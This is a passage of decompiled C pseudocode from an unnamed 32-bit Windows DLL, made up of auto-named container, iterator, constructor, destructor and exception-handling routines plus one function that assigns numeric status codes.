char sub_10004C87()
{
  _DWORD *v0; // eax
  char v1; // bl
  int v3[35]; // [esp+8h] [ebp-98h] BYREF
  int v4; // [esp+9Ch] [ebp-4h]

  sub_100035BB();
  v0 = sub_100016F0(dword_10091C08, v3);
  v4 = 0;
  v1 = sub_10004A96((int)(v0 + 18));
  v4 = -1;
  sub_100010A5(v3);
  return v1;
}
// 10091C08: using guessed type int dword_10091C08;
// 10004C87: using guessed type int var_98[35];

//----- (10004CDE) --------------------------------------------------------
char sub_10004CDE()
{
  _DWORD *v0; // eax
  char v1; // bl
  int v3[35]; // [esp+8h] [ebp-98h] BYREF
  int v4; // [esp+9Ch] [ebp-4h]

  sub_100035BB();
  v0 = sub_100016F0(dword_10091C08, v3);
  v4 = 0;
  v1 = sub_10004A96((int)(v0 + 26));
  v4 = -1;
  sub_100010A5(v3);
  return v1;
}
// 10091C08: using guessed type int dword_10091C08;
// 10004CDE: using guessed type int var_98[35];

//----- (10004D35) --------------------------------------------------------
_DWORD *__stdcall sub_10004D35(_DWORD *a1, HWND hWndParent)
{
  int *v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp+0h] [ebp-58h] BYREF
  int v6[7]; // [esp+10h] [ebp-48h] BYREF
  _DWORD v7[4]; // [esp+2Ch] [ebp-2Ch] BYREF
  int v8[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  int v9; // [esp+54h] [ebp-4h]

  v8[3] = (int)&v5;
  sub_10003E8E(a1);
  v9 = 0;
  *a1 = &off_10072D44;
  sub_10009D2C(a1 + 2, &word_1008FAD0);
  LOBYTE(v9) = 1;
  sub_10005560(&dword_100954C0);
  LOBYTE(v9) = 2;
  v2 = (int *)sub_1000962B(v8, hWndParent);
  LOBYTE(v9) = 3;
  sub_100021B1(v2 + 1, a1 + 3);
  LOBYTE(v9) = 2;
  sub_10009F65(v8);
  v9 = 1;
  v3 = sub_10006BE5(v6, hWndParent);
  LOBYTE(v9) = 5;
  sub_1000541B(&dword_100954C0, (int)v3);
  LOBYTE(v9) = 1;
  sub_10006D31(v6);
  sub_10004E9B(v7);
  LOBYTE(v9) = 6;
  sub_100095CD((LPARAM)v7, hWndParent);
  a1[1] = 1001;
  if ( sub_10004C87() )
  {
    a1[1] = 3005;
  }
  else if ( sub_10004C30() )
  {
    a1[1] = 3004;
  }
  else if ( sub_10004BD8((int)a1) )
  {
    a1[1] = 3001;
  }
  else if ( sub_10004CDE() )
  {
    a1[1] = 2001;
  }
  LOBYTE(v9) = 1;
  sub_10004ECE(v7);
  return a1;
}
// 10072D44: using guessed type int (__thiscall *off_10072D44)(void *Block, char);
// 100954C0: using guessed type int dword_100954C0;
// 10004D35: using guessed type _DWORD var_2C[4];

//----- (10004E7F) --------------------------------------------------------
int *__thiscall sub_10004E7F(int *Block, char a2)
{
  sub_10004F0F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10004E9B) --------------------------------------------------------
_DWORD *__stdcall sub_10004E9B(_DWORD *a1)
{
  sub_100055EC(a1);
  *a1 = &off_10072E18;
  return a1;
}
// 10072E18: using guessed type int (__thiscall *off_10072E18)(void *Block, char);

//----- (10004ECE) --------------------------------------------------------
void *__stdcall sub_10004ECE(_DWORD *a1)
{
  return sub_10005629(a1);
}

//----- (10004EF2) --------------------------------------------------------
_DWORD *__thiscall sub_10004EF2(_DWORD *Block, char a2)
{
  sub_10004ECE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10004F0F) --------------------------------------------------------
void __thiscall sub_10004F0F(int *this)
{
  *this = (int)&off_10072D44;
  sub_10009F65(this + 2);
  sub_10003EDF(this);
}
// 10072D44: using guessed type int (__thiscall *off_10072D44)(void *Block, char);

//----- (10004F4A) --------------------------------------------------------
bool __thiscall sub_10004F4A(_DWORD *this)
{
  return this[1] > 2000;
}

//----- (10004F55) --------------------------------------------------------
char __thiscall sub_10004F55(int *this)
{
  char v2; // bl

  v2 = 0;
  if ( this[1] > 2000 || !sub_10004ACA((int)this) && this[1] > 1000 )
    return 1;
  return v2;
}

//----- (10004F7E) --------------------------------------------------------
void __thiscall sub_10004F7E(unsigned __int16 *this, int *a2)
{
  int v3; // ecx
  void (__thiscall **v4)(int *); // eax
  _DWORD *v5; // edi
  int v6; // ecx
  void (__thiscall **v7)(int *, int, int); // eax
  int v8; // ecx
  void (__thiscall **v9)(int *); // eax
  int v10; // ecx
  int v11; // [esp-8h] [ebp-5Ch] BYREF
  int v12; // [esp-4h] [ebp-58h]
  int v13; // [esp+0h] [ebp-54h] BYREF
  int v14[2]; // [esp+Ch] [ebp-48h] BYREF
  char v15[8]; // [esp+14h] [ebp-40h] BYREF
  int v16; // [esp+1Ch] [ebp-38h]
  int v17; // [esp+20h] [ebp-34h]
  int v18; // [esp+24h] [ebp-30h]
  int v19[3]; // [esp+3Ch] [ebp-18h] BYREF
  int v20; // [esp+50h] [ebp-4h]

  v19[2] = (int)&v13;
  sub_1000408E(this, a2);
  v20 = 0;
  v12 = v3;
  v11 = v3;
  sub_10009F32(&v11, (int)(this + 4));
  LOBYTE(v20) = 1;
  v4 = (void (__thiscall **)(int *))(*a2 + 72);
  LOBYTE(v20) = 0;
  (*v4)(a2);
  sub_1000518B(&dword_100954C0, v19);
  LOBYTE(v20) = 2;
  while ( !(*(unsigned __int8 (__thiscall **)(int, int, int))(*(_DWORD *)v19[0] + 4))(v19[0], v11, v12) )
  {
    v5 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v19[0] + 12))(v19[0]);
    sub_10004A45(v5, v14);
    LOBYTE(v20) = 3;
    v12 = v6;
    v11 = v6;
    sub_10009F32(&v11, (int)v14);
    LOBYTE(v20) = 4;
    v7 = (void (__thiscall **)(int *, int, int))(*a2 + 72);
    LOBYTE(v20) = 3;
    (*v7)(a2, v11, v12);
    (*(void (__thiscall **)(int *, int))(*a2 + 60))(a2, v17);
    (*(void (__thiscall **)(int *, int))(*a2 + 60))(a2, v18);
    v12 = v8;
    v11 = v8;
    sub_10009F32(&v11, (int)v15);
    LOBYTE(v20) = 5;
    v9 = (void (__thiscall **)(int *))(*a2 + 72);
    LOBYTE(v20) = 3;
    (*v9)(a2);
    (*(void (__thiscall **)(int *, int))(*a2 + 60))(a2, v16);
    sub_100055B4(v10, v19[0]);
    LOBYTE(v20) = 2;
    sub_10006D31(v14);
  }
  LOBYTE(v20) = 0;
  sub_100067AA(v19);
}
// 10004FA3: variable 'v3' is possibly undefined
// 10004FFB: variable 'v6' is possibly undefined
// 10005031: variable 'v8' is possibly undefined
// 10005060: variable 'v10' is possibly undefined
// 100954C0: using guessed type int dword_100954C0;
// 10004F7E: using guessed type char var_40[8];

//----- (100050B0) --------------------------------------------------------
int sub_100050B0()
{
  return 46;
}

//----- (100050B4) --------------------------------------------------------
int *sub_100050B4()
{
  sub_10005CC8();
  dword_100954C0 = (int)&off_10072D60;
  dword_100954C4 = 0;
  dword_100954C8 = 0;
  dword_100954CC = 0;
  return &dword_100954C0;
}
// 10072D60: using guessed type int (__thiscall *off_10072D60)(void *Block, char);
// 100954C0: using guessed type int dword_100954C0;
// 100954C4: using guessed type int dword_100954C4;
// 100954C8: using guessed type int dword_100954C8;
// 100954CC: using guessed type int dword_100954CC;

//----- (100050FE) --------------------------------------------------------
void *__thiscall sub_100050FE(_DWORD *this)
{
  int *i; // esi
  int *v3; // ebx
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10072D60;
  v6 = 1;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[7];
    sub_10005B68(i);
  }
  v6 = -1;
  return sub_1000530B(this);
}
// 10072D60: using guessed type int (__thiscall *off_10072D60)(void *Block, char);

//----- (10005163) --------------------------------------------------------
void *__thiscall sub_10005163(void *this, int a2)
{
  sub_10005C64(a2, (int)this);
  return this;
}

//----- (10005175) --------------------------------------------------------
void *__thiscall sub_10005175(void *this, int a2)
{
  sub_10005C64(a2, (int)this);
  return this;
}

//----- (10005187) --------------------------------------------------------
int __thiscall sub_10005187(_DWORD *this)
{
  return this[3];
}

//----- (1000518B) --------------------------------------------------------
_DWORD *__thiscall sub_1000518B(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10005E4D(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10006766(a2, (int)v4);
  return a2;
}

//----- (100051EB) --------------------------------------------------------
_DWORD *__thiscall sub_100051EB(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10006053(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_100067FD(a2, (int)v4);
  return a2;
}

//----- (1000524B) --------------------------------------------------------
_DWORD *__thiscall sub_1000524B(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10005E4D(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10006766(a2, (int)v4);
  return a2;
}

//----- (100052AB) --------------------------------------------------------
_DWORD *__thiscall sub_100052AB(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10006053(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_100067FD(a2, (int)v4);
  return a2;
}

//----- (1000530B) --------------------------------------------------------
void *__thiscall sub_1000530B(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F8BC;
  *this = &off_10072DA0;
  *this = off_10072944;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10072DA0: using guessed type int (__thiscall *off_10072DA0)(void *Block, char);

//----- (10005335) --------------------------------------------------------
int *__thiscall sub_10005335(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100055B4(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000538D: variable 'v5' is possibly undefined

//----- (100053A8) --------------------------------------------------------
int *__thiscall sub_100053A8(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10005D13(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10005400: variable 'v5' is possibly undefined

//----- (1000541B) --------------------------------------------------------
void __thiscall sub_1000541B(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_100067AA(v2);
}

//----- (10005459) --------------------------------------------------------
void __thiscall sub_10005459(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_100067AA(v3);
}

//----- (1000549A) --------------------------------------------------------
void __thiscall sub_1000549A(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_100067AA(v2);
}

//----- (100054D8) --------------------------------------------------------
int __thiscall sub_100054D8(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10006841(v4);
  return v2;
}

//----- (1000551C) --------------------------------------------------------
int __thiscall sub_1000551C(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100067AA(v4);
  return v2;
}

//----- (10005560) --------------------------------------------------------
void __thiscall sub_10005560(void *this)
{
  int v1[3]; // [esp+0h] [ebp-18h] BYREF
  int v2; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_100067AA(v1);
}

//----- (100055B4) --------------------------------------------------------
int __usercall sub_100055B4@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100055EC) --------------------------------------------------------
_DWORD *__stdcall sub_100055EC(_DWORD *a1)
{
  sub_10005DA8(a1);
  *a1 = &off_10072E58;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 10072E58: using guessed type int (__thiscall *off_10072E58)(void *Block, char);

//----- (10005629) --------------------------------------------------------
void *__thiscall sub_10005629(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10072E58;
  v6 = 1;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[1];
    j__free(i);
  }
  v6 = -1;
  return sub_10005838(this);
}
// 10072E58: using guessed type int (__thiscall *off_10072E58)(void *Block, char);

//----- (10005690) --------------------------------------------------------
void *__thiscall sub_10005690(void *this, int a2)
{
  sub_10005D44(a2, (int)this);
  return this;
}

//----- (100056A2) --------------------------------------------------------
void *__thiscall sub_100056A2(void *this, int a2)
{
  sub_10005D44(a2, (int)this);
  return this;
}

//----- (100056B4) --------------------------------------------------------
int __thiscall sub_100056B4(_DWORD *this)
{
  return this[3];
}

//----- (100056B8) --------------------------------------------------------
_DWORD *__thiscall sub_100056B8(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10006259(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10006894(a2, (int)v4);
  return a2;
}

//----- (10005718) --------------------------------------------------------
_DWORD *__thiscall sub_10005718(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10006433(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_1000692B(a2, (int)v4);
  return a2;
}

//----- (10005778) --------------------------------------------------------
_DWORD *__thiscall sub_10005778(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10006259(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10006894(a2, (int)v4);
  return a2;
}

//----- (100057D8) --------------------------------------------------------
_DWORD *__thiscall sub_100057D8(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10006433(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_1000692B(a2, (int)v4);
  return a2;
}

//----- (10005838) --------------------------------------------------------
void *__thiscall sub_10005838(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F766;
  *this = &off_10072E98;
  *this = off_10072944;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10072E98: using guessed type int (__thiscall *off_10072E98)(void *Block, char);

//----- (10005862) --------------------------------------------------------
int *__thiscall sub_10005862(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10005DDC(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100058BA: variable 'v5' is possibly undefined

//----- (100058D5) --------------------------------------------------------
int *__thiscall sub_100058D5(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10005E1C(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000592D: variable 'v5' is possibly undefined

//----- (10005948) --------------------------------------------------------
void __thiscall sub_10005948(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_100068D8(v2);
}

//----- (10005986) --------------------------------------------------------
void __thiscall sub_10005986(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_100068D8(v3);
}

//----- (100059C7) --------------------------------------------------------
void __thiscall sub_100059C7(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_100068D8(v2);
}

//----- (10005A05) --------------------------------------------------------
int __thiscall sub_10005A05(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000696F(v4);
  return v2;
}

//----- (10005A49) --------------------------------------------------------
int __thiscall sub_10005A49(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100068D8(v4);
  return v2;
}

//----- (10005A8D) --------------------------------------------------------
void __thiscall sub_10005A8D(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_100068D8(v1);
}

//----- (10005AE2) --------------------------------------------------------
char __thiscall sub_10005AE2(void *this, int a2)
{
  char v2; // bl
  int v3; // eax
  int v4; // ecx
  int v6[2]; // [esp+8h] [ebp-14h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, v6);
  v2 = 0;
  v7 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]);
    if ( !sub_1000A1C0(a2, v3) )
    {
      v2 = 1;
      break;
    }
    sub_10001E0A(v4, v6[0]);
  }
  v7 = -1;
  sub_100029B6(v6);
  return v2;
}
// 10005B19: variable 'v4' is possibly undefined

//----- (10005B4C) --------------------------------------------------------
_DWORD *__thiscall sub_10005B4C(_DWORD *Block, char a2)
{
  sub_100050FE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005B68) --------------------------------------------------------
int *__usercall sub_10005B68@<eax>(int *a1@<esi>)
{
  sub_10005C40(a1);
  j__free(a1);
  return a1;
}

//----- (10005B78) --------------------------------------------------------
_DWORD *__thiscall sub_10005B78(_DWORD *Block, char a2)
{
  sub_1000530B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005BCE) --------------------------------------------------------
_DWORD *__thiscall sub_10005BCE(_DWORD *Block, char a2)
{
  sub_10005629(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005BEA) --------------------------------------------------------
_DWORD *__thiscall sub_10005BEA(_DWORD *Block, char a2)
{
  sub_10005838(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005C40) --------------------------------------------------------
void __stdcall sub_10005C40(int *a1)
{
  sub_10006D31(a1);
}

//----- (10005C64) --------------------------------------------------------
void __usercall sub_10005C64(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10005D13(v4, v5[0]);
  }
  v6 = -1;
  sub_10006841(v5);
}
// 10005C9E: variable 'v4' is possibly undefined

//----- (10005CC8) --------------------------------------------------------
int *sub_10005CC8()
{
  int *result; // eax

  result = &dword_100954C0;
  dword_100954C0 = (int)&off_10072DA0;
  return result;
}
// 10072DA0: using guessed type int (__thiscall *off_10072DA0)(void *Block, char);
// 100954C0: using guessed type int dword_100954C0;

//----- (10005D13) --------------------------------------------------------
int __usercall sub_10005D13@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10005D44) --------------------------------------------------------
void __usercall sub_10005D44(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10005E1C(v4, v5[0]);
  }
  v6 = -1;
  sub_1000696F(v5);
}
// 10005D7E: variable 'v4' is possibly undefined

//----- (10005DA8) --------------------------------------------------------
_DWORD *__stdcall sub_10005DA8(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10072E98;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10072E98: using guessed type int (__thiscall *off_10072E98)(void *Block, char);

//----- (10005DDC) --------------------------------------------------------
int __usercall sub_10005DDC@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10005E1C) --------------------------------------------------------
int __usercall sub_10005E1C@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10005E4D) --------------------------------------------------------
_DWORD *__thiscall sub_10005E4D(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10072DD8;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10072F10;
  a2[3] = a3;
  return result;
}
// 10072DD8: using guessed type int (__thiscall *off_10072DD8)(void *Block, char);
// 10072F10: using guessed type int (__thiscall *off_10072F10)(void *Block, char);

//----- (10005E8B) --------------------------------------------------------
void *__thiscall sub_10005E8B(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F6B2;
  *this = &off_10072F10;
  *this = &off_10072DD8;
  return result;
}
// 10072DD8: using guessed type int (__thiscall *off_10072DD8)(void *Block, char);
// 10072F10: using guessed type int (__thiscall *off_10072F10)(void *Block, char);

//----- (10005EB5) --------------------------------------------------------
BOOL __thiscall sub_10005EB5(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10005EBE) --------------------------------------------------------
BOOL __thiscall sub_10005EBE(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10005EC7) --------------------------------------------------------
int __thiscall sub_10005EC7(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10005EEB) --------------------------------------------------------
int __thiscall sub_10005EEB(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
